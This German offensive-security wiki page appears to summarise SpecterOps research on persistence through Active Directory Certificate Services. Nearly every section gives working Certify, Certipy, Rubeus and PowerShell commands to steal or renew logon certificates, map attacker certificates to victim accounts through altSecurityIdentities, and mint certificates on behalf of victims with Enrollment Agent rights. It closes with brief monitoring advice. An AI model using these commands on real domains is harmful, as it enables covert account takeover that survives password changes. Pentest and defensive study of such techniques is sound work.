# AD CS Kontenpersistenz

{{#include ../../../banners/hacktricks-training.md}}

**Dies ist eine kurze Zusammenfassung der Kapitel zur Kontenpersistenz der großartigen Forschung von [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Verständnis des Diebstahls aktiver Benutzeranmeldeinformationen mittels Zertifikaten – PERSIST1

In einem Szenario, in dem ein Zertifikat, das die Domänen-Authentifizierung ermöglicht, von einem Benutzer angefordert werden kann, hat ein Angreifer die Möglichkeit, dieses Zertifikat anzufordern und zu stehlen, um Persistenz in einem Netzwerk aufrechtzuerhalten. Standardmäßig erlaubt die `User`-Vorlage in Active Directory solche Anfragen, obwohl sie manchmal deaktiviert sein kann.

Mit [Certify](https://github.com/GhostPack/Certify) oder [Certipy](https://github.com/ly4k/Certipy) können Sie nach aktivierten Vorlagen suchen, die Client-Authentifizierung erlauben, und dann eine anfordern:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Die Stärke eines Zertifikats liegt in seiner Fähigkeit, sich als der Benutzer zu authentifizieren, dem es gehört, unabhängig von Passwortänderungen, solange das Zertifikat gültig bleibt.

Du kannst PEM in PFX konvertieren und es verwenden, um ein TGT zu erhalten:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Hinweis: In Kombination mit anderen Techniken (siehe THEFT sections) ermöglicht certificate-based auth persistenten Zugriff, ohne LSASS zu berühren, und sogar aus nicht erhöhten Kontexten.

## Erlangen von Maschinenpersistenz mit Zertifikaten - PERSIST2

Wenn ein Angreifer erhöhte Berechtigungen auf einem Host hat, kann er das Maschinenkonto des kompromittierten Systems für ein Zertifikat mit der Standardvorlage `Machine` registrieren. Die Authentifizierung als Maschinenkonto aktiviert S4U2Self für lokale Dienste und kann dauerhafte Host-Persistenz bieten:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Erweiterung der Persistenz durch Zertifikatserneuerung - PERSIST3

Die Ausnutzung der Gültigkeits- und Erneuerungszeiträume von Zertifikatvorlagen ermöglicht einem Angreifer, langfristigen Zugriff aufrechtzuerhalten. Wenn Sie ein zuvor ausgestelltes Zertifikat und dessen privaten Schlüssel besitzen, können Sie es vor Ablauf erneuern, um ein neues, langfristig gültiges Anmeldezertifikat zu erhalten, ohne zusätzliche Anforderungsartefakte zu hinterlassen, die an die ursprüngliche Identität gebunden sind.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Operationeller Tipp: Verfolge die Laufzeiten von vom Angreifer gehaltenen PFX-Dateien und erneuere frühzeitig. Eine Erneuerung kann außerdem bewirken, dass aktualisierte Zertifikate die moderne SID mapping extension enthalten, wodurch sie unter strengeren DC mapping rules weiter verwendbar bleiben (siehe nächsten Abschnitt).

## Explizite Zertifikatszuordnungen setzen (altSecurityIdentities) – PERSIST4

Wenn du in das `altSecurityIdentities`-Attribut eines Zielkontos schreiben kannst, kannst du explizit ein vom Angreifer kontrolliertes Zertifikat diesem Konto zuordnen. Diese Zuordnung bleibt auch bei Passwortänderungen bestehen und funktioniert bei Verwendung starker Zuordnungsformate weiterhin unter moderner DC-Durchsetzung.

High-level flow:

1. Obtain or issue a client-auth certificate you control (e.g., enroll `User` template as yourself).
2. Extract a strong identifier from the cert (Issuer+Serial, SKI, or SHA1-PublicKey).
3. Add an explicit mapping on the victim principal’s `altSecurityIdentities` using that identifier.
4. Authenticate with your certificate; the DC maps it to the victim via the explicit mapping.

Example (PowerShell) using a strong Issuer+Serial mapping:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Authentifizieren Sie sich dann mit Ihrem PFX. Certipy wird direkt ein TGT beziehen:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Aufbau starker `altSecurityIdentities`-Zuordnungen

In der Praxis sind **Issuer+Serial**- und **SKI**-Zuordnungen die am einfachsten aus einem vom Angreifer gehaltenen Zertifikat zu erstellenden starken Formate. Das ist wichtig nach dem **11. Februar 2025**, wenn DCs standardmäßig auf **Full Enforcement** umstellen und schwache Zuordnungen nicht mehr zuverlässig sind.
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Hinweise
- Verwende nur starke Mapping-Typen: `X509IssuerSerialNumber`, `X509SKI` oder `X509SHA1PublicKey`. Schwache Formate (Subject/Issuer, Subject-only, RFC822 email) sind veraltet und können durch DC-Richtlinie blockiert werden.
- Das Mapping funktioniert sowohl für **user**- als auch **computer**-Objekte, daher reicht Schreibzugriff auf das `altSecurityIdentities` eines Computer-Kontos aus, um als diese Maschine persistent zu bleiben.
- Die Zertifikatskette muss bis zu einer vom DC vertrauten Root aufgebaut werden. Enterprise CAs in NTAuth werden typischerweise vertraut; einige Umgebungen vertrauen auch öffentlichen CAs.
- Schannel-Authentifizierung bleibt für Persistenz nützlich, selbst wenn PKINIT fehlschlägt, weil der DC die Smart Card Logon EKU nicht hat oder `KDC_ERR_PADATA_TYPE_NOSUPP` zurückgibt.

Mehr zu schwachen expliziten Mappings und Angriffswegen siehe:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent als Persistenz – PERSIST5

Wenn du ein gültiges Certificate Request Agent/Enrollment Agent-Zertifikat erhältst, kannst du nach Belieben neue zur Anmeldung geeignete Zertifikate im Namen von Benutzern ausstellen und das Agent-PFX offline als Persistenz-Token aufbewahren. Missbrauchsablauf:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Die Widerrufung des Agenten-Zertifikats oder der Template-Berechtigungen ist erforderlich, um diese Persistenz zu entfernen.

Betriebliche Hinweise
- Moderne `Certipy` Versionen unterstützen sowohl `-on-behalf-of` als auch `-renew`, sodass ein Angreifer, der eine Enrollment Agent PFX hält, Leaf-Zertifikate erstellen und später erneuern kann, ohne das ursprüngliche Zielkonto erneut anzufassen.
- Wenn eine PKINIT-basierte TGT-Beschaffung nicht möglich ist, ist das resultierende on-behalf-of certificate dennoch für die Schannel-Authentifizierung mit `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell` verwendbar.

## 2025 Strong Certificate Mapping Enforcement: Auswirkungen auf Persistenz

Microsoft KB5014754 führte die Strong Certificate Mapping Enforcement auf Domain Controllern ein. Seit dem 11. Februar 2025 sind DCs standardmäßig auf Full Enforcement eingestellt und lehnen schwache/mehrdeutige Zuordnungen ab. Praktische Auswirkungen:

- Pre-2022-Zertifikate, die die SID-Mapping-Erweiterung nicht enthalten, können bei DCs im Full Enforcement an impliziter Zuordnung scheitern. Angreifer können den Zugriff aufrechterhalten, indem sie Zertifikate über AD CS erneuern (um die SID-Erweiterung zu erhalten) oder indem sie eine starke explizite Zuordnung in `altSecurityIdentities` (PERSIST4) eintragen.
- Explizite Zuordnungen mit starken Formaten (Issuer+Serial, SKI, SHA1-PublicKey) funktionieren weiterhin. Schwache Formate (Issuer/Subject, Subject-only, RFC822) können blockiert werden und sollten für Persistenz vermieden werden.

Administratoren sollten überwachen und Alarm setzen bei:
- Änderungen an `altSecurityIdentities` sowie Ausstellung/Erneuerung von Enrollment Agent- und User-Zertifikaten.
- CA-Ausstellungsprotokollen für on-behalf-of-Anfragen und ungewöhnlichen Erneuerungsmustern.

## Referenzen

- Microsoft. KB5014754: Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- SpecterOps. ADCS ESC14 Abuse Technique (explicit `altSecurityIdentities` abuse on user/computer objects).
https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/
- Certipy Wiki – Command Reference (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- Almond Offensive Security. Authenticating with certificates when PKINIT is not supported.
https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html

{{#include ../../../banners/hacktricks-training.md}}
